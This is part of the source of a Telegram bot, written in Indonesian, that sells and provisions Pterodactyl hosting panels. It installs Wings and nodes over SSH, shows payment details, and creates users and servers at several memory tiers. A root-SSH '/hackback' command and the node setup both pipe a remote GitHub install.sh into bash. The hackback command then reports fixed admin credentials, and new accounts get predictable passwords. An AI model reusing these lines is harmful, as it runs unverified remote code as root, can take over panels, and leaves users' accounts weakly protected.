    bot.sendMessage(chatId, '𝗣𝗥𝗢𝗦𝗘𝗦 𝗣𝗘𝗡𝗚𝗜𝗡𝗦𝗧𝗔𝗟𝗟𝗔𝗡 𝗪𝗜𝗡𝗚𝗦 𝗦𝗘𝗗𝗔𝗡𝗚 𝗕𝗘𝗥𝗟𝗔𝗡𝗚𝗦𝗨𝗡𝗚 𝗠𝗢𝗛𝗢𝗡 𝗧𝗨𝗡𝗚𝗚𝗨 𝟱 𝗠𝗘𝗡𝗜𝗧');
    conn.exec(commandWings, (err, stream) => {
      if (err) {
        bot.sendMessage(chatId, '𝗧𝗲𝗿𝗷𝗮𝗱𝗶 𝗸𝗲𝘀𝗮𝗹𝗮𝗵𝗮𝗻 𝘀𝗮𝗮𝘁 𝗺𝗲𝗻𝗷𝗮𝗹𝗮𝗻𝗸𝗮𝗻 𝗽𝗲𝗿𝗶𝗻𝘁𝗮𝗵 𝗶𝗻𝘀𝘁𝗮𝗹𝗮𝘀𝗶 𝘄𝗶𝗻𝗴𝘀.');
        conn.end();
        return;
      }
      
      stream.on('close', (code, signal) => {
        console.log(`Wings installation stream closed with code ${code} and signal ${signal}`);
        createNode(conn, domainnode, ramvps, subdomain, password);
      }).on('data', (data) => {
        handleWingsInstallationInput(data, stream, domainnode, subdomain);
      }).stderr.on('data', (data) => {
        console.log('STDERR: ' + data);
      });
    });
  }

  async function createNode(conn, domainnode, ramvps, subdomain, password) {
    const command = 'bash <(curl -s https://raw.githubusercontent.com/LeXcZxMoDz9/Installerlex/refs/heads/main/install.sh)';
    bot.sendMessage(chatId, '𝗠𝗘𝗠𝗨𝗟𝗔𝗜 𝗖𝗥𝗘𝗔𝗧𝗘 𝗡𝗢𝗗𝗘 & 𝗟𝗢𝗖𝗔𝗧𝗜𝗢𝗡');
    
    conn.exec(command, (err, stream) => {
      if (err) {
        bot.sendMessage(chatId, '𝗧𝗲𝗿𝗷𝗮𝗱𝗶 𝗸𝗲𝘀𝗮𝗹𝗮𝗵𝗮𝗻 𝘀𝗮𝗮𝘁 𝗺𝗲𝗺𝗯𝘂𝗮𝘁 𝗻𝗼𝗱𝗲.');
        conn.end();
        return;
      }

      stream.on('close', (code, signal) => {
        console.log(`Node creation stream closed with code ${code} and ${signal} signal`);
        conn.end();
        sendPanelData(subdomain);
      }).on('data', (data) => {
        handleNodeCreationInput(data, stream, domainnode, ramvps);
      }).stderr.on('data', (data) => {
        console.log('STDERR: ' + data);
      });
    });
  }

  function sendPanelData(subdomain) {
    bot.sendMessage(chatId, `𝗗𝗔𝗧𝗔 𝗣𝗔𝗡𝗘𝗟 𝗔𝗡𝗗𝗔\n\n𝗨𝗦𝗘𝗥𝗡𝗔𝗠𝗘: 𝗢𝘁𝗮𝘅\n𝗣𝗔𝗦𝗦𝗪𝗢𝗥𝗗: 𝗢𝘁𝗮𝘅\n𝗟𝗢𝗚𝗜𝗡: ${subdomain}\n\n𝗡𝗼𝘁𝗲: 𝗦𝗲𝗺𝘂𝗮 𝗜𝗻𝘀𝘁𝗮𝗹𝗮𝘀𝗶 𝗧𝗲𝗹𝗮𝗵 𝗦𝗲𝗹𝗲𝘀𝗮𝗶. 𝗦𝗶𝗹𝗮𝗵𝗸𝗮𝗻 𝗰𝗿𝗲𝗮𝘁𝗲 𝗮𝗹𝗹𝗼𝗰𝗮𝘁𝗶𝗼𝗻 𝗱𝗶 𝗻𝗼𝗱𝗲 𝘆𝗮𝗻𝗴 𝗱𝗶𝗯𝘂𝗮𝘁 𝗼𝗹𝗲𝗵 𝗯𝗼𝘁 𝗱𝗮𝗻 𝗮𝗺𝗯𝗶𝗹 𝘁𝗼𝗸𝗲𝗻 𝗸𝗼𝗻𝗳𝗶𝗴𝘂𝗿𝗮𝘀𝗶, 𝗹𝗮𝗹𝘂 𝗸𝗲𝘁𝗶𝗸 /𝘄𝗶𝗻𝗴𝘀 𝗶𝗽𝘃𝗽𝘀,𝗽𝘄𝘃𝗽𝘀,(𝘁𝗼𝗸𝗲𝗻). \n𝗡𝗼𝘁𝗲: 𝗛𝗮𝗿𝗮𝗽 𝘁𝘂𝗻𝗴𝗴𝘂 𝟭-𝟱 𝗺𝗲𝗻𝗶𝘁 𝗮𝗴𝗮𝗿 𝘄𝗲𝗯 𝗯𝗶𝘀𝗮 𝗱𝗶𝗮𝗸𝘀𝗲𝘀.`);
  }

  function handlePanelInstallationInput(data, stream, subdomain, password) {
    if (data.toString().includes('Input')) {
      stream.write('0\n');
    }
    if (data.toString().includes('Input')) {
            stream.write(`${password}\n`);
        }
        if (data.toString().includes('Input')) {
            stream.write(`${password}\n`);
        }
        if (data.toString().includes('Input')) {
            stream.write(`${password}\n`);
        }
        if (data.toString().includes('Input')) {
            stream.write('Asia/Jakarta\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('otaxoffc@gmail.com\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('otaxoffc@gmail.com\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('otax\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('otax\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('otax\n');
        }
        if (data.toString().includes('Input')) {
            stream.write(`otax\n`);
        }
        if (data.toString().includes('Input')) {
            stream.write(`${subdomain}\n`);
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('yes\n');
        }
        if (data.toString().includes('Please read the Terms of Service')) {
            stream.write('A\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('1\n');
        }
    console.log('STDOUT: ' + data);
  }

  function handleWingsInstallationInput(data, stream, domainnode, subdomain) {
    if (data.toString().includes('Input')) {
      stream.write('1\n');
    }
    if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write(`${subdomain}\n`);
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write(`${password}\n`);
        }
        if (data.toString().includes('Input')) {
            stream.write(`${password}\n`);
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write(`${domainnode}\n`);
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('otaxoffc@gmail.com\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
    console.log('STDOUT: ' + data);
  }

  function handleNodeCreationInput(data, stream, domainnode, ramvps) {
    stream.write('4\n');
    stream.write('Otax\n');
    stream.write('Otax\n');
    stream.write(`${domainnode}\n`);
    stream.write('Otax\n');
    stream.write(`${ramvps}\n`);
    stream.write(`${ramvps}\n`);
    stream.write('1\n');
    console.log('STDOUT: ' + data);
  }
});

//▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰//HACKBACK PANEL
bot.onText(/^(\.|\#|\/)hackback$/, async (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, `𝗙𝗼𝗿𝗺𝗮𝘁 𝘀𝗮𝗹𝗮𝗵!\n𝗣𝗲𝗻𝗴𝗴𝘂𝗻𝗮𝗮𝗻: /hackback 𝗶𝗽𝘃𝗽𝘀,𝗽𝗮𝘀𝘀𝘄𝗼𝗿𝗱`);
  });
bot.onText(/\/hackback (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
   const delay = ms => new Promise(res => setTimeout(res, ms));
  const text = match[1];
  const userId = msg.from.id;
  const t = text.split(',');
  if (!isOwner(senderId)) {
        return bot.sendMessage(
            chatId,
            "𝘿𝙖𝙣 𝙔𝙖𝙥!? 𝙀𝙣𝙩𝙚 𝙎𝙞𝙖𝙥𝙖? 𝙔𝙖𝙣𝙜 𝘽𝙞𝙨𝙖 𝙈𝙖𝙠𝙚 𝘾𝙪𝙢𝙖𝙣 𝙊𝙬𝙣𝙚𝙧 𝙂𝙬!!✘𓂸",
            { parse_mode: "Markdown" }
        );
  }
  if (t.length < 2) {
    return bot.sendMessage(chatId, '𝗙𝗼𝗿𝗺𝗮𝘁 𝘀𝗮𝗹𝗮𝗵!\n𝗣𝗲𝗻𝗴𝗴𝘂𝗻𝗮𝗮𝗻: /hackback 𝗶𝗽𝘃𝗽𝘀,𝗽𝗮𝘀𝘀𝘄𝗼𝗿𝗱,𝘁𝗼𝗸𝗲𝗻');
  }
  const ipvps = t[0];
  const passwd = t[1];

  const connSettings = {
    host: ipvps,
    port: 22,
    username: 'root',
    password: passwd
  };
    const conn = new Client();
    const command = 'bash <(curl -s https://raw.githubusercontent.com/LeXcZxMoDz9/Installerlex/refs/heads/main/install.sh)'
 
    conn.on('ready', () => {
        isSuccess = true; 
        bot.sendMessage(chatId,'PROSES HACK BACK PTERODACTYL')
        
        conn.exec(command, (err, stream) => {
            if (err) throw err;
            stream.on('close', (code, signal) => {
                console.log('Stream closed with code ${code} and ${signal} signal');
         bot.sendMessage(chatId, '𝗗𝗔𝗧𝗔 𝗣𝗔𝗡𝗘𝗟 𝗔𝗡𝗗𝗔\n\n𝗨𝗦𝗘𝗥𝗡𝗔𝗠𝗘: lexcz\n𝗣𝗔𝗦𝗦𝗪𝗢𝗥𝗗: lexcz\n\n\n');
                conn.end();
            }).on('data', (data) => {
                stream.write('7\n');
                console.log('STDOUT: ' + data);
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }).on('error', (err) => {
        console.log('Connection Error: ' + err);
        bot.sendMessage(chatId, 'Katasandi atau IP tidak valid');
    }).connect(connSettings);
});
//▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰//
// qris
bot.onText(/\/qris/, (msg) => {
    const chatId = msg.chat.id;
    const qris = settings.qris;

    bot.sendPhoto(chatId, qris, {
    caption: `\`\`\`INGAT!!!\`\`\`
( ! ) jangan Lupa Untuk Menyertakan Bukti Pembayaran
`,
  parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "𝘖𝘸𝘯𝘦𝘳", url: "https://t.me/Otapengenkawin" }]
      ]
    }
  });
});

bot.onText(/\/dana/, (msg) => {
    const chatId = msg.chat.id;
    const dana = settings.dana

    bot.sendMessage(chatId, dana, {
    caption: `\`\`\`INGAT!!!\`\`\`
( ! ) jangan Lupa Untuk Menyertakan Bukti Pembayaran
`,
    parse_mode: "Markdown",
  });
});

bot.onText(/\/ovo/, (msg) => {
    const chatId = msg.chat.id;
    const ovo = settings.ovo

    bot.sendMessage(chatId, ovo, {
    caption: `\`\`\`INGAT!!!\`\`\`
( ! ) jangan Lupa Untuk Menyertakan Bukti Pembayaran
`,
    parse_mode: "Markdown",
  });
});

bot.onText(/\/gopay/, (msg) => {
    const chatId = msg.chat.id;
    const gopay = settings.gopay

    bot.sendMessage(chatId, gopay, {
    caption: `\`\`\`INGAT!!!\`\`\`
( ! ) jangan Lupa Untuk Menyertakan Bukti Pembayaran
`,
    parse_mode: "Markdown",
  });
});

bot.onText(/\/panel/, (msg) => {
    const chatId = msg.chat.id;
    const sender = msg.from.username;
    const owner = config.OWNER_ID;
    const text12 = `*Hi @${sender} 👋*
    
𝗖𝗔𝗥𝗔 𝗕𝗜𝗞𝗜𝗡𝗡𝗬𝗔 𝗚𝗜𝗡𝗜 !
𝘉𝘠.𝘖𝘛𝘈𝘟

𝗖𝗔𝗥𝗔 𝗔𝗗𝗗 𝗨𝗦𝗘𝗥 𝗣𝗔𝗡𝗘𝗟 :
𝗿𝗮𝗺 𝘂𝘀𝗲𝗿𝘀,𝗜𝗱

𝗰𝗼𝗻𝘁𝗼𝗵 : /𝟭𝗴𝗯 𝗢𝗧𝗔𝗫,𝟭𝟯𝟰𝟰𝟱𝟱𝘅𝘅𝘅

𝗕𝘂𝘆 𝗦𝗰 𝗢𝘁𝗮𝘅? 𝗕𝘂𝘆 𝗔𝗱𝗺𝗶𝗻 𝗣𝗮𝗻𝗲𝗹&𝗣𝘁 𝗣𝗮𝗻𝗲𝗹? 𝗣𝘃 (@Otapengenkawin)`;
    const keyboard = {
        reply_markup: {
            inline_keyboard: [
                [{ text: '🖥️ Buy Panel', url: 'https://t.me/Otapengenkawin/beli_panel_bangl' }, { text: '👤 Buy Sc Otax', url: 'https://t.me/Otapengenkawin/buy_Sc_Otax' }]
            ]
        }
    };
    bot.sendPhoto(chatId, randomImage, { caption: text12, parse_mode: 'Markdown', reply_markup: keyboard });
});   

//case create panel
bot.onText(/\/1gb (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
   const delay = ms => new Promise(res => setTimeout(res, ms));
  const text = match[1];
  const userId = msg.from.id;
  const randomImage = getRandomImage();
if (shouldIgnoreMessage(msg)) return;
    
  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`𝙀𝙩𝙙𝙖𝙝\`\`\`
𝙀𝙢𝙖𝙣𝙜𝙣𝙮𝙖 𝙇𝙪 𝙎𝙞𝙖𝙥𝙖ूाीू ?
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "𝘖𝘸𝘯𝘦𝘳", url: "https://t.me/Otapengenkawin" }]
      ]
    }
  });
}
  const t = text.split(",");
  if (t.length < 2) {
    bot.sendMessage(chatId, "Invalid format. Usage: /1gb namapanel,idtele");
    return;
  }
  const username = t[0];
  const u = t[1];
  const name = username + "1gb";
  const egg = settings.eggs;
  const loc = settings.loc;
  const memo = "1024";
  const cpu = "30";
  const disk = "1024";
  const spc =
    'if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == "1" ]]; then git pull; fi; if [[ ! -z ${NODE_PACKAGES} ]]; then /usr/local/bin/npm install ${NODE_PACKAGES}; fi; if [[ ! -z ${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall ${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/${CMD_RUN}';
  const email = `${username}@buyer.OTAX`;
  const akunlo = randomImage;
  const password = `${username}001`;
  let user;
  let server;
  try {
    const response = await fetch(`${domain}/api/application/users`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        email: email,
        username: username,
        first_name: username,
        last_name: username,
        language: "en",
        password: password,
      }),
    });
    const data = await response.json();
    if (data.errors) {
      if (
        data.errors[0].meta.rule === "unique" &&
        data.errors[0].meta.source_field === "email"
      ) {
        bot.sendMessage(
          chatId,
          "Email already exists. Please use a different email."
        );
      } else {
        bot.sendMessage(
          chatId,
          `Error: ${JSON.stringify(data.errors[0], null, 2)}`
        );
      }
      return;
    }
    user = data.attributes;
    const response2 = await fetch(`${domain}/api/application/servers`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        name: name,
        description: "",
        user: user.id,
        egg: parseInt(egg),
        docker_image: "ghcr.io/parkervcp/yolks:nodejs_22",
        startup: spc,
        environment: {
          INST: "npm",
          USER_UPLOAD: "0",
          AUTO_UPDATE: "0",
          CMD_RUN: "npm start",
        },
        limits: {
          memory: memo,
          swap: 0,
          disk: disk,
          io: 500,
          cpu: cpu,
        },
        feature_limits: {
          databases: 5,
          backups: 5,
          allocations: 1,
        },
        deploy: {
          locations: [parseInt(loc)],
          dedicated_ip: false,
          port_range: [],
        },
      }),
    });
    const data2 = await response2.json();
    server = data2.attributes;
  } catch (error) {
    bot.sendMessage(chatId, `Error: ${error.message}`);
  }
  if (user && server) {
    bot.sendMessage(
      chatId,
      `Nih Data Panelnya😁
NAMA: ${username}
EMAIL: ${email}
ID: ${user.id}
MEMORY: ${server.limits.memory === 0 ? "Unlimited" : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? "Unlimited" : server.limits.disk} MB
CPU: ${server.limits.cpu}%`
    );
    if (akunlo) {
      bot.sendPhoto(u, akunlo, {
        caption: `Hai @${u}

 PANEL DATA ANDA :
×͜× Login : ${domain}
×͜× Username : ${user.username}
×͜× Password : ${password} 
┏━━━━━━━⬣
│• Jangan Ddos Server
│• Wajib tutup domain saat screenshot
┗━━━━━━━━━━━━━━━━━━⬣
𝗖𝗥𝗘𝗔𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 𝗕𝗬 𝗢𝗧𝗔𝗫`,
      });
      bot.sendMessage(
        chatId,
        "Data Panel Sudah Dikirim Bos Ku Bisa Di Cek Ya!!🔥"
      );
    }
  } else {
    bot.sendMessage(chatId, "Haduh..Gagal Bosku Sabar Ya, Kayaknya ada kesalahan😮‍💨.");
  }
});
// 2gb
bot.onText(/\/2gb (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
   const delay = ms => new Promise(res => setTimeout(res, ms));
  const text = match[1];
  const userId = msg.from.id;
  const randomImage = getRandomImage();
if (shouldIgnoreMessage(msg)) return;
    
  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`𝙀𝙩𝙙𝙖𝙝\`\`\`
𝙀𝙢𝙖𝙣𝙜𝙣𝙮𝙖 𝙇𝙪 𝙎𝙞𝙖𝙥𝙖ूाीू ?
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "𝘖𝘸𝘯𝘦𝘳", url: "https://t.me/Otapengenkawin" }]
      ]
    }
  });
}
  const t = text.split(",");
  if (t.length < 2) {
    bot.sendMessage(chatId, "Invalid format. Usage: /2gb namapanel,idtele");
    return;
  }
  const username = t[0];
  const u = t[1];
  const name = username + "2gb";
  const egg = settings.eggs;
  const loc = settings.loc;
  const memo = "2048";
  const cpu = "60";
  const disk = "2048";
  const spc =
    'if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == "1" ]]; then git pull; fi; if [[ ! -z ${NODE_PACKAGES} ]]; then /usr/local/bin/npm install ${NODE_PACKAGES}; fi; if [[ ! -z ${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall ${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/${CMD_RUN}';
  const email = `${username}_${u}@buyer.OTAX`;
  const akunlo = randomImage;
  const password = `${username}001`;
  let user;
  let server;
  try {
    const response = await fetch(`${domain}/api/application/users`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        email: email,
        username: username,
        first_name: username,
        last_name: username,
        language: "en",
        password: password,
      }),
    });
    const data = await response.json();
    if (data.errors) {
      if (
        data.errors[0].meta.rule === "unique" &&
        data.errors[0].meta.source_field === "email"
      ) {
        bot.sendMessage(
          chatId,
          "Email already exists. Please use a different email."
        );
      } else {
        bot.sendMessage(
          chatId,
          `Error: ${JSON.stringify(data.errors[0], null, 2)}`
        );
      }
      return;
    }
    user = data.attributes;
    const response2 = await fetch(`${domain}/api/application/servers`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        name: name,
        description: "",
        user: user.id,
        egg: parseInt(egg),
        docker_image: "ghcr.io/parkervcp/yolks:nodejs_22",
        startup: spc,
        environment: {
          INST: "npm",
          USER_UPLOAD: "0",
          AUTO_UPDATE: "0",
          CMD_RUN: "npm start",
        },
        limits: {
          memory: memo,
          swap: 0,
          disk: disk,
          io: 500,
          cpu: cpu,
        },
        feature_limits: {
          databases: 5,
          backups: 5,
          allocations: 1,
        },
        deploy: {
          locations: [parseInt(loc)],
          dedicated_ip: false,
          port_range: [],
        },
      }),
    });
    const data2 = await response2.json();
    server = data2.attributes;
  } catch (error) {
    bot.sendMessage(chatId, `Error: ${error.message}`);
  }
  if (user && server) {
    bot.sendMessage(
      chatId,
      `Nih Data Panelnya😁
NAMA: ${username}
EMAIL: ${email}
ID: ${user.id}
MEMORY: ${server.limits.memory === 0 ? "Unlimited" : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? "Unlimited" : server.limits.disk} MB
CPU: ${server.limits.cpu}%`
    );
    if (akunlo) {
      bot.sendPhoto(u, akunlo, {
        caption: `Hai @${u}

 PANEL DATA ANDA :
×͜× Login : ${domain}
×͜× Username : ${user.username}
×͜× Password : ${password} 
┏━━━━━━━⬣
│• Jangan Ddos Server
│• Wajib tutup domain saat screenshot
│• Jngan bagikan domain ke siapapun
┗━━━━━━━━━━━━━━━━━━⬣
𝗖𝗥𝗘𝗔𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 𝗕𝗬 𝗢𝗧𝗔𝗫`,
      });
      bot.sendMessage(
        chatId,
        "Data Panel Sudah Dikirim Bos Ku Bisa Di Cek Ya!!🔥"
      );
    }
  } else {
    bot.sendMessage(chatId, "Haduh..Gagal Bosku Sabar Ya, Kayaknya ada kesalahan😮‍💨.");
  }
});
//▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰//
// 3gb
// 3gb
bot.onText(/\/3gb (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
   const delay = ms => new Promise(res => setTimeout(res, ms));
  const text = match[1];
  const userId = msg.from.id;
  const randomImage = getRandomImage();
if (shouldIgnoreMessage(msg)) return;
    
  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`𝙀𝙩𝙙𝙖𝙝\`\`\`
𝙀𝙢𝙖𝙣𝙜𝙣𝙮𝙖 𝙇𝙪 𝙎𝙞𝙖𝙥𝙖ूाीू ?
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "𝘖𝘸𝘯𝘦𝘳", url: "https://t.me/Otapengenkawin" }]
      ]
    }
  });
}
  const t = text.split(",");
  if (t.length < 2) {
    bot.sendMessage(chatId, "Invalid format. Usage: /3gb namapanel,idtele");
    return;
  }
  const username = t[0];
  const u = t[1];
  const name = username + "3gb";
  const egg = settings.eggs;
  const loc = settings.loc;
  const memo = "3072";
  const cpu = "90";
  const disk = "3072";
  const spc =
    'if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == "1" ]]; then git pull; fi; if [[ ! -z ${NODE_PACKAGES} ]]; then /usr/local/bin/npm install ${NODE_PACKAGES}; fi; if [[ ! -z ${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall ${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/${CMD_RUN}';
  const email = `${username}@buyer.OTAX`;
  const akunlo = randomImage;
  const password = `${username}001`;
  let user;
  let server;
  try {
    const response = await fetch(`${domain}/api/application/users`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        email: email,
        username: username,
        first_name: username,
        last_name: username,
        language: "en",
        password: password,
      }),
    });
    const data = await response.json();
    if (data.errors) {
      if (
        data.errors[0].meta.rule === "unique" &&
        data.errors[0].meta.source_field === "email"
      ) {
        bot.sendMessage(chatId, "Email&user telah ada di data panel vemos.");
      } else {
        bot.sendMessage(
          chatId,
          `Error: ${JSON.stringify(data.errors[0], null, 2)}`
        );
      }
      return;
    }
    user = data.attributes;
    const response2 = await fetch(`${domain}/api/application/servers`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        name: name,
        description: "",
        user: user.id,
        egg: parseInt(egg),
        docker_image: "ghcr.io/parkervcp/yolks:nodejs_22",
        startup: spc,
        environment: {
          INST: "npm",
          USER_UPLOAD: "0",
          AUTO_UPDATE: "0",
          CMD_RUN: "npm start",
        },
        limits: {
          memory: memo,
          swap: 0,
          disk: disk,
          io: 500,
          cpu: cpu,
        },
        feature_limits: {
          databases: 5,
          backups: 5,
          allocations: 1,
        },
        deploy: {
          locations: [parseInt(loc)],
          dedicated_ip: false,
          port_range: [],
        },
      }),
    });
    const data2 = await response2.json();
    server = data2.attributes;
  } catch (error) {
    bot.sendMessage(chatId, `Error: ${error.message}`);
  }
  if (user && server) {
    bot.sendMessage(
      chatId,
      `Nih Data Panelnya😁
NAMA: ${username}
EMAIL: ${email}
ID: ${user.id}
MEMORY: ${server.limits.memory === 0 ? "Unlimited" : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? "Unlimited" : server.limits.disk} MB
CPU: ${server.limits.cpu}%`
    );
    if (akunlo) {
      bot.sendPhoto(u, akunlo, {
        caption: `Hai @${u}

PANEL DATA ANDA :
×͜× Login : ${domain}
×͜× Username : ${user.username}
×͜× Password : ${password} 
┏━━━━━━━⬣
│RULES :
│• Jangan Ddos Server
│• Wajib tutup domain saat screenshot
│• Jngan bagikan domain ke siapapun
┗━━━━━━━━━━━━━━━━━━⬣
𝗖𝗥𝗘𝗔𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 𝗕𝗬 𝗢𝗧𝗔𝗫`,
      });
      bot.sendMessage(
        chatId,
        "Data Panel Sudah Dikirim Bos Ku Bisa Di Cek Ya!!🔥"
      );
    }
  } else {
    bot.sendMessage(chatId, "Haduh..Gagal Bosku Sabar Ya, Kayaknya ada kesalahan😮‍💨.");
  }
});
//▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰//
// 4gb
bot.onText(/\/4gb (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
   const delay = ms => new Promise(res => setTimeout(res, ms));
  const text = match[1];
  const userId = msg.from.id;
  const randomImage = getRandomImage();
if (shouldIgnoreMessage(msg)) return;
    
  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`𝙀𝙩𝙙𝙖𝙝\`\`\`
𝙀𝙢𝙖𝙣𝙜𝙣𝙮𝙖 𝙇𝙪 𝙎𝙞𝙖𝙥𝙖ूाीू ?
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "𝘖𝘸𝘯𝘦𝘳", url: "https://t.me/Otapengenkawin" }]
      ]
    }
  });
}
  const t = text.split(",");
  if (t.length < 2) {
    bot.sendMessage(chatId, "Invalid format. Usage: /4gb namapanel,idtele");
    return;
  }
  const username = t[0];  
  const u = t[1];
  const name = username + "4gb";
  const egg = settings.eggs;
  const loc = settings.loc;
  const memo = "4048";
  const cpu = "110";
  const disk = "4048";
  const spc =
    'if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == "1" ]]; then git pull; fi; if [[ ! -z ${NODE_PACKAGES} ]]; then /usr/local/bin/npm install ${NODE_PACKAGES}; fi; if [[ ! -z ${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall ${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/${CMD_RUN}';
  const email = `${username}@buyer.OTAX`;
  const akunlo = randomImage;
  const password = `${username}001`;
  let user;
  let server;
  try {
    const response = await fetch(`${domain}/api/application/users`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        email: email,
        username: username,
        first_name: username,
        last_name: username,
        language: "en",
        password: password,
      }),
    });
    const data = await response.json();
    if (data.errors) {
      if (
        data.errors[0].meta.rule === "unique" &&
        data.errors[0].meta.source_field === "email"
      ) {
        bot.sendMessage(
          chatId,
          "Email already exists. Please use a different email."
        );
      } else {
        bot.sendMessage(
          chatId,
          `Error: ${JSON.stringify(data.errors[0], null, 2)}`
        );
      }
      return;
    }
    user = data.attributes;
    const response2 = await fetch(`${domain}/api/application/servers`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        name: name,
        description: "",
        user: user.id,
        egg: parseInt(egg),
        docker_image: "ghcr.io/parkervcp/yolks:nodejs_22",
        startup: spc,
        environment: {
          INST: "npm",
          USER_UPLOAD: "0",
          AUTO_UPDATE: "0",
          CMD_RUN: "npm start",
        },
        limits: {
          memory: memo,
          swap: 0,
          disk: disk,
          io: 500,
          cpu: cpu,
        },
        feature_limits: {
          databases: 5,
          backups: 5,
          allocations: 1,
        },
        deploy: {
          locations: [parseInt(loc)],
          dedicated_ip: false,
          port_range: [],
        },
      }),
    });
    const data2 = await response2.json();
    server = data2.attributes;
  } catch (error) {
    bot.sendMessage(chatId, `Error: ${error.message}`);
  }
  if (user && server) {
    bot.sendMessage(
      chatId,
      `Nih Data Panelnya😁
NAMA: ${username}
EMAIL: ${email}
ID: ${user.id}
MEMORY: ${server.limits.memory === 0 ? "Unlimited" : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? "Unlimited" : server.limits.disk} MB
CPU: ${server.limits.cpu}%`
    );
    if (akunlo) {
      bot.sendPhoto(u, akunlo, {
        caption: `Hai @${u}

 PANEL DATA ANDA :
×͜× Login : ${domain}
×͜× Username : ${user.username}
×͜× Password : ${password} 
